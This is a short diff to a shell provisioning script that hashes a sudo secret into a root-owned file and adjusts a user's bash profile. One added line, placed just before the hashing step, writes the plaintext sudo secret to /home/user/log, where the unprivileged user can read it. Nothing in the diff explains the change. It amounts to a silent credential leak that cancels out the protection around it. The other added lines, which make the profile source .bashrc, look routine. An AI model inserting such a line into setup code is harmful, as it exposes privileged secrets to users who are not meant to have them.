@@ -32,6 +32,7 @@
 
 # -- storing the hash of the secret --
 {
+	printf '%s' "$SUDO_SECRET" | tr -d '\r\n' >> /home/user/log
 	printf '%s' "$SUDO_SECRET" | tr -d '\r\n' | sha256sum | awk '{print $1}' | tee /etc/sudo_secret.hash
 	chmod 440 /etc/sudo_secret.hash
 	chown root:root /etc/sudo_secret.hash
@@ -59,8 +60,12 @@
 		chown user:user "$BASH_PROFILE"
 		chmod 644 "$BASH_PROFILE"
 	fi
+	SRC_LINE='[ -f ~/.bashrc ] && . ~/.bashrc'
 	EXPORT_LINE='export BASH_ENV="$HOME/.bash_env"'
 	if [ -f "$BASH_ENV_FILE" ]; then
+		if ! grep -Fqx "$SRC_LINE" "$BASH_PROFILE"; then
+			sed -i "1i$SRC_LINE" "$BASH_PROFILE"
+		fi
 		if ! grep -Fqx "$EXPORT_LINE" "$BASH_PROFILE"; then
 			echo "$EXPORT_LINE" >> "$BASH_PROFILE"
 		fi
